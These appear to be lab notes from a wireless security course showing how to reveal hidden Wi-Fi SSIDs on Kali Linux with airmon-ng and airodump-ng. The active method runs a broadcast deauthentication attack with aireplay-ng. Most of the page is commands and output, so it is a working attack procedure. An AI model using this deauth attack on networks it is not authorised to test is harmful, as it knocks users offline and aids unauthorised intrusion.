#### Part 6: Pwning Hidden SSIDs

Before connecting the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 51830  bytes 3435415 (3.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 47066  bytes 33321752 (31.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 248  bytes 12512 (12.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 248  bytes 12512 (12.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```	
	
Connect the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 113  bytes 13062 (12.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 116  bytes 19058 (18.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig -a
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 124  bytes 13940 (13.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 123  bytes 20732 (20.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4098<BROADCAST,MULTICAST>  mtu 1500
        ether 00:c0:ca:92:3c:89  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig wlan0 up
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 377  bytes 30254 (29.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 169  bytes 26425 (25.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether ae:ac:75:a7:71:b2  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```

Put the card in monitor mode

```sh
root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~# airmon-ng start wlan0

Found 3 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to run 'airmon-ng check kill'

  PID Name
  400 NetworkManager
  569 dhclient
  804 wpa_supplicant

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)

root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0mon	rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~#
```

Check for the monitor mode interface

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 518  bytes 40324 (39.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 236  bytes 35799 (34.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 00-C0-CA-92-3C-89-30-30-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 858  bytes 151521 (147.9 KiB)
        RX errors 0  dropped 858  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

root@kali:~#
```

Identify channel of AP
<br/>
The AP ```HiddenSSID``` is not Hidden

```sh
root@kali:~# airodump-ng wlan0mon

 CH  3 ][ Elapsed: 0 s ][ 2017-06-05 13:19

 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 78:F2:9E:D2:F3:3B  -51        3        0    0   6  54e. OPN              <length:  0>
 BC:EE:7B:DE:56:31  -58        2        0    0   2  54e  WPA2 CCMP   PSK  ASUS_Guest
 BC:EE:7B:DE:56:30  -59        2        0    0   2  54e  WPA2 CCMP   PSK  <length: 10>
 56:1F:E4:E5:52:91  -40        2        0    0  11  54e. WPA2 CCMP   PSK  <length:  0>
 C4:04:15:3A:8B:30  -52        2        0    0  11  54e  WPA2 CCMP   PSK  NETGEAR43
 76:1F:E4:E5:52:91  -35        2        0    0  11  54e. WPA2 CCMP   MGT  <length:  0>
 46:1F:E4:E5:52:91  -40        3        0    0  11  54e. OPN              xfinitywifi
 84:C9:B2:6D:0C:85  -37        4        0    0   4  54e. OPN              HiddenSSID
 78:F2:9E:D2:F3:3A  -37        2        0    0   6  54e. OPN              xfinitywifi
 34:97:F6:08:DB:18  -31        2        7    3   9  54e  WPA2 CCMP   PSK  IZZY
 50:6A:03:AE:3A:FB  -54        3        0    0   7  54e  WPA2 CCMP   PSK  NETGEAR36
 CE:35:40:49:8D:A2  -68        2        0    0   1  54e. WPA2 CCMP   PSK  <length: 12>
 AE:34:26:8A:34:A2  -38        2        0    0   1  54e. OPN              xfinitywifi
 E2:3E:FC:97:32:00  -66        2        0    0   1  54e  WPA2 CCMP   PSK  <length:  0>
 E8:3E:FC:97:32:00  -66        2        0    0   1  54e  WPA2 CCMP   PSK  HOME-3202
 16:4E:5A:FB:44:46  -58        2        0    0   1  54e. OPN              xfinitywifi
 B4:75:0E:20:71:AE  -67        2        0    0   1  54e  WPA2 CCMP   PSK  belkin.1ae
 10:0D:7F:DB:EC:84  -64        5        0    0   1  54e  WPA2 CCMP   PSK  CG3000DV208
 CE:35:40:49:8D:A3  -68        2        0    0   1  54e. OPN              xfinitywifi
 A0:63:91:4B:42:82  -36        5        0    0   3  54e  WPA2 CCMP   PSK  NETGEAR91

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 (not associated)   F4:0F:24:33:5E:D1  -67    0 - 1      0        2
 50:6A:03:AE:3A:FB  00:CD:FE:9E:0C:F2   -1    1e- 0      0        4

root@kali:~#
```

AP Config for Hidden SSID
![Image of Config](https://github.com/Kan1shka9/Wireless-LAN-Security-Megaprimer-Notes/blob/master/images/part_6.jpeg)

* Method 1 - Passive

	Monitor air for a new client trying to associate with the
access point

Capture packets in the air
<br/>
Hidden SSIDs have the ```ESSID :- <length:  0>```

```sh
root@kali:~# airodump-ng wlan0mon --channel 4 --bssid 84:C9:B2:6D:0C:85

 CH  4 ][ Elapsed: 6 s ][ 2017-06-05 13:31

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 84:C9:B2:6D:0C:85  -17  90       64        2    0   4  54e. OPN              <length:  0>

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 84:C9:B2:6D:0C:85  F4:0F:24:33:5E:D1   -1   54e-      0       0        2

root@kali:~#
```

The moment a client connects to the hidden AP the ```ESSID``` value changes to ```HiddenSSID```

```sh
root@kali:~# airodump-ng wlan0mon --channel 4 --bssid 84:C9:B2:6D:0C:85

 CH  4 ][ Elapsed: 30 s ][ 2017-06-05 13:34

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 84:C9:B2:6D:0C:85   -7  87      281       85    1   4  54e. OPN              HiddenSSID

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 84:C9:B2:6D:0C:85  F4:0F:24:33:5E:D1  -22   54e- 1      0        8

root@kali:~#
```

* Method 2 - Active

	De-authenticate one or all clients and monitor reconnections

Capture packets in the air
<br/>
Hidden SSIDs have the ```ESSID :- <length:  0>```

```sh
root@kali:~# airodump-ng wlan0mon --channel 4 --bssid 84:C9:B2:6D:0C:85

 CH  4 ][ Elapsed: 6 s ][ 2017-06-05 13:51

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 84:C9:B2:6D:0C:85  -32   0        6       28    2   4  54e. OPN              <length:  0>

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 84:C9:B2:6D:0C:85  BC:9F:EF:69:35:19   -9    0 -24     12        3
 84:C9:B2:6D:0C:85  F4:0F:24:33:5E:D1  -57   54e- 1e    42      446

root@kali:~#
```

Disconnect all clients connected to the Hidden AP

```sh
root@kali:~# aireplay-ng --deauth 0 -a 84:C9:B2:6D:0C:85 wlan0mon
13:52:15  Waiting for beacon frame (BSSID: 84:C9:B2:6D:0C:85) on channel 4
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
13:52:15  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
13:52:16  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
13:52:16  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
13:52:17  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
13:52:17  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
13:52:18  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
13:52:18  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
13:52:19  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
13:52:19  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
13:52:20  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
13:52:20  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
^C
root@kali:~#
```

Stop the deauth attack so that clients can reconnect to the AP

The moment a client connects to the hidden AP the ```ESSID``` value changes to ```HiddenSSID```

```sh
root@kali:~# airodump-ng wlan0mon --channel 4 --bssid 84:C9:B2:6D:0C:85

 CH  4 ][ Elapsed: 0 s ][ 2017-06-05 13:52

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 84:C9:B2:6D:0C:85  -12  10       49       50    8   4  54e. OPN              HiddenSSID

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 84:C9:B2:6D:0C:85  F4:0F:24:33:5E:D1   -9   54e-24e   710       37
 84:C9:B2:6D:0C:85  BC:9F:EF:69:35:19  -12    0 -24     52       21

root@kali:~#
```
